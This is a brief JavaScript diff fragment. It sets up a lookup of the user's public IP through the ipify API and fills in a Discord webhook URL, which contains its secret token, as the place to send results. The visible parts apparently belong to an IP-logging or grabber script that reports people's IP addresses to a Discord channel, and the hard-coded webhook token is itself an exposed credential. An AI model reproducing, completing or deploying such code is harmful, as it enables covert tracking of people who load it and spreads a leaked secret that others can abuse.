@@ -2,7 +2,7 @@
 const ipifyAPI = "https://api.ipify.org?format=json";
 
 
-const webhookURL = "Input your webhook url here (your webhook url can be seen easily)";
+const webhookURL = "https://discord.com/api/webhooks/1372285967603597453/T1Yrp0hIeFnY3tb-1M1Fc1VBctWzDtJQm0EnD6uOEDwrQzk05z3IXlEhGa7T9E0cff4G";
 
 
 async function getIP() {
